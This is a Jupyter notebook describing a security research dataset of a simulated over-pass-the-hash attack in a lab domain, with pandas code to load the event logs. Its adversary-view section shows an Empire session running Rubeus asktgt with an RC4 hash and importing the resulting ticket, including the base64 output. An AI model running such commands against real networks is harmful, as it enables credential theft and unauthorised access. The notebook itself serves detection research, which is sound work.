{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0176e3d8",
   "metadata": {},
   "source": [
    "# Rubeus Userland ASKTGT PTT"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7aa64178",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c020f81a",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.003](https://attack.mitre.org/techniques/T1003/003) |\n",
    "| Tags              | Over-Pass-The-Hash,Not Touching LSASS |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "12a00b63",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69920523",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1b723ffb",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_ptt.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_ptt.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_ptt.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_ptt.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93c633fd",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b8a4ea80",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0b78dd01",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [shell](None) |\n",
    "| binary | Rubeus | [asktgt](https://github.com/GhostPack/Rubeus) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "056acb68",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http            \n",
    "\n",
    "(Empire: agents) > interact 4EH9PC5S\n",
    "(Empire: 4EH9PC5S) > \n",
    "(Empire: 4EH9PC5S) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt\n",
    "[*] Tasked 4EH9PC5S to run TASK_SHELL\n",
    "[*] Agent 4EH9PC5S tasked with task ID 2\n",
    "(Empire: 4EH9PC5S) > \n",
    "______        _                      \n",
    "  (_____ \\      | |                     \n",
    "  _____) )_   _| |__  _____ _   _  ___ \n",
    "  |  __  /| | | |  _ \\| ___ | | | |/___)\n",
    "  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n",
    "  |_|   |_|____/|____/|_____)____/(___/\n",
    "\n",
    "  v1.5.0 \n",
    "\n",
    "[*] Action: Ask TGT\n",
    "\n",
    "[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n",
    "[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n",
    "[+] TGT request successful!\n",
    "[*] base64(ticket.kirbi):\n",
    "\n",
    "      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\n",
    "      MBgbBmtyYnRndBsOdGhlc2hpcmUubG9jYWw=\n",
    "[+] Ticket successfully imported!\n",
    "\n",
    "  ServiceName           :  krbtgt/theshire.local\n",
    "  ServiceRealm          :  THESHIRE.LOCAL\n",
    "  UserName              :  pgustavo\n",
    "  UserRealm             :  THESHIRE.LOCAL\n",
    "  StartTime             :  9/21/2020 10:39:13 PM\n",
    "  EndTime               :  9/22/2020 8:39:13 AM\n",
    "  RenewTill             :  9/28/2020 10:39:13 PM\n",
    "  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n",
    "  KeyType               :  rc4_hmac\n",
    "  Base64(key)           :  ZO21dWzTLeccdZTeq4SgMA==\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 4EH9PC5S) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e415e23",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "521b901d",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0a64906",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_ptt.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cf7ca594",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7237595c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "96a985da",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17b6216b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "09e0e96d",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
